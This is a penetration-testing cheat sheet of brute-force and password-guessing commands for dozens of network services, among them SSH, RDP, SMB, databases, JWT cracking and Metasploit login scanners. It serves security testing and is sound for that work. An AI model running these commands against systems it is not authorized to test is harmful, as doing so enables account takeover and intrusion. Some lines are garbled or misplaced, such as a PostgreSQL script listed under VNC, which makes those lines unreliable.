# Port, Protocol, and Service Specific

## Services

Ordered alphabetically by service name.

AFP

nmap -p 548 --script afp-brute

msf> use auxiliary/scanner/afp/afp\_login

msf> set BLANK\_PASSWORDS true

msf> set USER\_AS\_PASS true

msf> set PASS\_FILE \<PATH\_PASSWDS>

msf> set USER\_FILE \<PATH\_USERS>

msf> run

AJP

nmap --script ajp-brute -p 8009

Cassandra

nmap --script cassandra-brute -p 9160

CouchDB

msf> use auxiliary/scanner/couchdb/couchdb\_login

hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /

Docker Registry

hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/

Elasticsearch

hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /

FTP

hydra -l root -P passwords.txt \[-t 32] ftp

ncrack -p 21 --user root -P passwords.txt \[-T 5]

medusa -u root -P 500-worst-passwords.txt -h -M ftp

HTTP Generic Brute

WFuzz

HTTP Basic Auth

hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/

## Use https-get mode for https

medusa -h -u -P  \<passwords.txt> -M  http -m DIR:/path/to/auth -T 10

HTTP - Post Form

hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^\&password=^PASS^\&enter=Sign+in:Login name or password is incorrect" -V

## Use https-post-form mode for https

For https you have to change from "http-post-form" to "https-post-form"

HTTP - CMS -- (W)ordpress, (J)oomla or (D)rupal or (M)oodle

cmsmap -f W/J/D/M -u a -p a [https://wordpress.com](https://wordpress.com)

IMAP

hydra -l USERNAME -P /path/to/passwords.txt -f imap -V

hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f imap -V

nmap -sV --script imap-brute -p

IRC

nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p

ISCSI

nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260

JWT

\#hashcat

hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

\#https://github.com/Sjord/jwtcrack

python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y\_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

\#John

john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

\#https://github.com/ticarpi/jwt\_tool

python3 jwt\_tool.py -d wordlists.txt

\#https://github.com/brendan-rius/c-jwt-cracker

./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y\_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

\#https://github.com/mazen160/jwt-pwn

python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y\_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

\#https://github.com/lmammino/jwt-cracker

jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6

LDAP

nmap --script ldap-brute -p 389

MQTT

ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v

Mongo

nmap -sV --script mongodb-brute -n -p 27017

use auxiliary/scanner/mongodb/mongodb\_login

MySQL

## hydra

hydra -L usernames.txt -P pass.txt mysql

## msfconsole

msf> use auxiliary/scanner/mysql/mysql\_login; set VERBOSE false

## medusa

medusa -h \<IP/Host> -u -P \<password\_list> <-f | to stop medusa on first success attempt> -t -M mysql

OracleSQL

patator oracle\_login sid= host= user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID

./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts\_multiple.txt

\#msf1

msf> use admin/oracle/oracle\_login

msf> set RHOSTS

msf> set RPORT 1521

msf> set SID

\#msf2, this option uses nmap and it fails sometimes for some reason

msf> use scanner/oracle/oracle\_login

msf> set RHOSTS

msf> set RPORTS 1521

msf> set SID

\#for some reason nmap fails sometimes when executing this script

nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=

In order to use oracle\_login with patator you need to install:

pip3 install cx\_Oracle --upgrade

Offline OracleSQL hash bruteforce (versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3):

&#x20;nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30

POP

hydra -l USERNAME -P /path/to/passwords.txt -f pop3 -V

hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f pop3 -V

PostgreSQL

hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt postgres

medusa -h –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres

ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt :5432

patator pgsql\_login host= user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt

use auxiliary/scanner/postgres/postgres\_login

nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432

PPTP

You can download the .deb package to install from [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)

sudo dpkg -i thc-pptp-bruter\*.deb #Install the package

cat rockyou.txt | thc-pptp-bruter –u

RDP

ncrack -vv --user -P pwds.txt rdp://

hydra -V -f -L -P rdp://

Redis

msf> use auxiliary/scanner/redis/redis\_login

nmap --script redis-brute -p 6379

hydra –P /path/pass.txt redis://: # 6379 is the default

Rexec

hydra -l -P \<password\_file> rexec:// -v -V

Rlogin

hydra -l -P \<password\_file> rlogin:// -v -V

Rsh

hydra -L \<Username\_list> rsh://\<Victim\_IP> -v -V

[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

Rsync

nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873

RTSP

hydra -l root -P passwords.txt rtsp

SNMP

msf> use auxiliary/scanner/snmp/snmp\_login

nmap -sU --script snmp-brute \[--script-args snmp-brute.communitiesdb= ]

onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp\_default\_pass.txt

hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp

SMB

nmap --script smb-brute -p 445

hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1

SMTP

hydra -l -P /path/to/passwords.txt smtp -V

hydra -l -P /path/to/passwords.txt -s 587 -S -v -V #Port 587 for SMTP with SSL

SOCKS

nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080

SSH

hydra -l root -P passwords.txt \[-t 32] ssh

ncrack -p 22 --user root -P passwords.txt \[-T 5]

medusa -u root -P 500-worst-passwords.txt -h -M ssh

patator ssh\_login host= port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'

Weak SSH keys / Debian predictable PRNG

Some systems have known flaws in the random seed used to generate cryptographic material. This can result in a dramatically reduced keyspace which can be bruteforced with tools such as snowdroppe/ssh-keybrute. Pre-generated sets of weak keys are also available such as g0tmi1k/debian-ssh.

SQL Server

\#Use the NetBIOS name of the machine as domain

crackmapexec mssql -d -u usernames.txt -p passwords.txt

hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt mssql

medusa -h –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql

nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts

msf> use auxiliary/scanner/mssql/mssql\_login #Be careful, you can block accounts. If you have a domain set it and use USE\_WINDOWS\_ATHENT

Telnet

hydra -l root -P passwords.txt \[-t 32] telnet

ncrack -p 23 --user root -P passwords.txt \[-T 5]

medusa -u root -P 500-worst-passwords.txt -h -M telnet

VNC

hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s vnc

medusa -h –u root -P /root/Desktop/pass.txt –M vnc

ncrack -V --user root -P /root/Desktop/pass.txt :>POR>T

patator vnc\_login host= password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0

use auxiliary/scanner/vnc/vnc\_login

nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432

\#Metasploit

use auxiliary/scanner/vnc/vnc\_login

set RHOSTS

set PASS\_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst

Winrm

crackmapexec winrm -d -u usernames.txt -p passwords.txt
